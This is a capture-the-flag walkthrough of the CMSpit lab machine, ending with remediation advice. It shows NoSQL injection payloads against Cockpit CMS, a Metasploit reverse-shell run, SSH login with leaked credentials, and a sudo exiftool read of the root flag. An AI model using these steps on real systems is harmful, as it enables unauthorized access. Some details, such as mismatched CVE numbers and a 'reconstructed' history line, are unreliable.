## CMSpit

Medium-difficulty Linux machine. A Cockpit CMS installation is vulnerable to NoSQL injection in the authentication and password reset endpoints. This allows enumeration of valid usernames and unauthorized password resets. A Metasploit exploit chains these vulnerabilities into remote code execution. A MongoDB shell history file leaks plaintext credentials for a local user. The user has a `NOPASSWD` sudo rule for `exiftool`, which can read arbitrary files, giving root access.

**Target:** 10.48.166.195 (cmspit)
**Difficulty:** Medium
**Focus:** CMS exploitation, NoSQL injection, privilege escalation via GTFOBins
**Attack Path:** Port scan → Web enumeration → NoSQL injection discovery → Username enumeration → Password reset RCE → Reverse shell → Credential leak → SSH → exiftool file read → Root

---

### PART 1: RECONNAISSANCE

**Full port scan**

```
nmap -p- 10.48.166.195
```

```
22/tcp  open  ssh    OpenSSH 7.2p2 Ubuntu
80/tcp  open  http   Apache 2.4.18 (Ubuntu)
```

**Service and version scan**

```
nmap -sV -sC -p 22,80 10.48.166.195
```

Port 80 serves a login page with the title "Authenticate Please!" and redirects to `/auth/login?to=/`. The application is Cockpit CMS, a headless content management system.

---

### PART 2: WEB ENUMERATION

**Directory fuzzing**

```
ffuf -u http://10.48.166.195/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt \
  -s -ac
```

**Discovered endpoints:**

```
LICENSE
addons
assets
auth
install
lib
modules
storage
```

Key endpoints:
- `/auth` - Authentication and password reset endpoints
- `/install` - Installation or configuration
- `/modules` - Extension or module management

---

### PART 3: COCKPIT CMS VULNERABILITIES

**Scenario hint:** The challenge states that the CMS has vulnerabilities in user enumeration and password reset. A quick search reveals the specific issue:

```
Cockpit CMS 0.11.1 - Username Enumeration & Password Reset (NoSQL Injection)
CVE-2020-35848, CVE-2020-35847
```

**Exploit availability**

The exploit is available in Exploit-DB:

```
searchsploit -m 50185
```

This retrieves `50185.py`, a Python script that exploits these NoSQL injection flaws.

---

### PART 4: NOSQL INJECTION - USERNAME ENUMERATION

**How the vulnerability works**

Cockpit CMS uses NoSQL (MongoDB) for backend storage. The authentication check and password reset endpoints do not properly sanitize user input before querying the database. An attacker can inject NoSQL operators (like `$ne` for "not equal") to bypass filters or enumerate valid usernames.

**Typical vulnerable endpoint:**

```
POST /auth/check
username=admin&password=anything
```

A NoSQL-vulnerable implementation might query:

```javascript
db.user.findOne({ "name": username, "password": password })
```

By sending `{"$ne": ""}` as the username, the query becomes:

```javascript
db.user.findOne({ "name": { "$ne": "" }, "password": password })
```

This returns any user regardless of password, leaking which usernames exist.

**Running the enumeration exploit**

```
python3 50185.py -u http://10.48.166.195/
```

**Output:**

```
[+] http://10.48.166.195/: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846):

[+] Users Found: ['admin', 'darkStar7471', 'skidy', 'ekoparty']
```

Four valid usernames are discovered.

---

### PART 5: NOSQL INJECTION - PASSWORD RESET

**The forgotten password endpoint**

Cockpit CMS has a `/auth/forgotpassword` page that allows users to reset their password. The backend processes this with a POST request to `/auth/requestreset`.

**Vulnerability in password reset**

The password reset function is also vulnerable to NoSQL injection. By crafting a malicious reset request, an attacker can:
1. Change the password of any user (not just their own)
2. Potentially inject code into the password reset flow

**Typical attack:**

```
POST /auth/requestreset
email={"$ne": ""}
```

This resets the password for the first user in the database (usually `admin`).

---

### PART 6: METASPLOIT RCE EXPLOIT

**Discovering the Metasploit module**

```
msfconsole
search cockpit
```

**Results:**

```
Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE
```

**Using the exploit**

```
use exploit/multi/http/cockpit_cms_rce
set LHOST 192.168.136.156
set LPORT 4444
set RHOST 10.48.166.195
set USERNAME admin
exploit
```

The exploit chains the NoSQL injection vulnerabilities to:
1. Enumerate or reset a user's password
2. Log in as that user (or directly execute commands)
3. Deliver a reverse shell

**Result:**

```
[*] Started reverse TCP handler on 192.168.136.156:4444
[+] Successfully exploited Cockpit CMS
[*] Meterpreter session 1 opened (192.168.136.156:4444 -> 10.48.166.195:46936)

meterpreter >
```

---

### PART 7: POST-EXPLOITATION (WEB FLAG)

**From the Meterpreter session, search for flags:**

```
meterpreter > cat webflag.php
```

**Output:**

```php
<?php
    $flag = "thm{f158bea70731c48b05657a02aaf955626d78e9fb}";
?>
```

The web application flag is found in a PHP file containing the flag in plaintext.

---

### PART 8: DISCOVER CREDENTIALS IN SHELL HISTORY

**Explore the stux user's home directory**

```
ls -lah /home/stux
```

**Output:**

```
-rw------- 1 stux stux   46 May 22  2021 user.txt
-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
```

The `.dbshell` file is world-readable and likely contains shell history or command information.

**Read the dbshell file**

```
cat /home/stux/.dbshell
```

**Output (reconstructed from notes):**

```
db.user.insert({name: "stux", name: "p4ssw0rdhack3d!123"})
```

A MongoDB insert command is found, which reveals plaintext credentials:
- Username: `stux`
- Password: `p4ssw0rdhack3d!123`

---

### PART 9: LATERAL MOVEMENT - SSH AS STUX

**Using discovered credentials**

```
ssh stux@10.48.166.195
Password: p4ssw0rdhack3d!123
```

Login as `stux` succeeds.

**Read the user flag**

```
cat ~/user.txt
```

---

### PART 10: PRIVILEGE ESCALATION VIA EXIFTOOL

**Check sudo rights**

```
sudo -l
```

**Output:**

```
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```

The user can run `exiftool` as root without a password.

**What is exiftool?** A tool for reading and writing EXIF metadata in images. It can also process files in unexpected ways.

**GTFOBins exploitation**

According to GTFOBins, `exiftool` has a "file write" capability that can be abused:

```
sudo exiftool -filename=/tmp/root_flag /root/root.txt
```

This command:
- Reads `/root/root.txt`
- Interprets it as an image or file
- Writes output to `/tmp/root_flag`

**Read the root flag**

```
cat /tmp/root_flag
```

Root flag is obtained.

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port scan (22, 80)
  └─ Service detection (Apache, Cockpit CMS)

PHASE 2: Web Enumeration
  ├─ Directory fuzzing
  └─ Identify /auth endpoints

PHASE 3: Vulnerability Research
  ├─ Search for Cockpit CMS vulnerabilities
  ├─ Find CVE-2020-35848, CVE-2020-35847
  └─ Locate exploit 50185.py

PHASE 4: NoSQL Injection - Enumeration
  ├─ Run exploit script
  └─ Enumerate usernames: admin, darkStar7471, skidy, ekoparty

PHASE 5: NoSQL Injection - Password Reset
  └─ Exploit /auth/requestreset endpoint

PHASE 6: RCE via Metasploit
  ├─ Use exploit/multi/http/cockpit_cms_rce
  ├─ Set target user to admin
  └─ Reverse shell as www-data

PHASE 7: Web Flag
  └─ Read webflag.php

PHASE 8: Credential Leak
  ├─ Discover .dbshell file
  ├─ Extract stux:p4ssw0rdhack3d!123
  └─ User credentials obtained

PHASE 9: User Access
  ├─ SSH as stux
  └─ User flag

PHASE 10: Privilege Escalation
  ├─ sudo -l: exiftool NOPASSWD
  ├─ sudo exiftool -filename=/tmp/root_flag /root/root.txt
  └─ Root flag
```

---

### VULNERABILITIES

1. **NoSQL Injection in Authentication (Critical)**
   - `/auth/check` endpoint does not sanitize user input
   - Allows username enumeration and authentication bypass

2. **NoSQL Injection in Password Reset (Critical)**
   - `/auth/requestreset` endpoint is vulnerable
   - Allows unauthorized password changes for any user

3. **Plaintext Credentials in Shell History (High)**
   - `.dbshell` file contains MongoDB insert commands with plaintext passwords
   - World-readable file exposes sensitive information

4. **exiftool Sudo Rule (High)**
   - User can run `exiftool` as root without restrictions
   - Tool can write or manipulate files, including reading arbitrary files

5. **Weak Password Policy (Medium)**
   - Application allows simple or guessable passwords
   - No complexity requirements enforced

---

### REMEDIATION

```
├─ Input validation and parameterized queries for all database operations
├─ Use prepared statements and ORM frameworks to prevent injection
├─ Implement rate limiting on authentication and password reset endpoints
├─ Require email verification for password reset; send reset links
├─ Store sensitive information (credentials, keys) only in secure vaults
├─ Use strong password hashing (bcrypt, Argon2) for user passwords
├─ Restrict access to shell history and configuration files (chmod 600)
├─ Limit sudo privileges to specific commands with required arguments
├─ Use `sudo -i` or `env -i` to strip environment when running privileged commands
└─ Regularly audit and test for NoSQL injection vulnerabilities
```

---

### TECHNICAL NOTES

**Tools and Methods Used:**
- nmap (port and service enumeration)
- ffuf (directory fuzzing)
- Python exploit script 50185.py (NoSQL injection)
- Metasploit exploit/multi/http/cockpit_cms_rce (RCE via password reset)
- SSH (credential-based login)
- exiftool (file manipulation for privilege escalation)
- GTFOBins (privilege escalation technique reference)

**Key Insight:** NoSQL injection in authentication and password reset endpoints gave initial access. Plaintext credentials in shell history enabled lateral movement. An overpermissive sudo rule for a file-manipulation tool gave root.

**Concepts to Study:**
- NoSQL injection techniques and operators (`$ne`, `$where`, etc.)
- RDBMS vs. NoSQL security differences
- Authentication bypass via injection
- Credential storage and management
- GTFOBins and tool abuse for privilege escalation
- Sudo privilege escalation vectors

# Jai Shri Ram
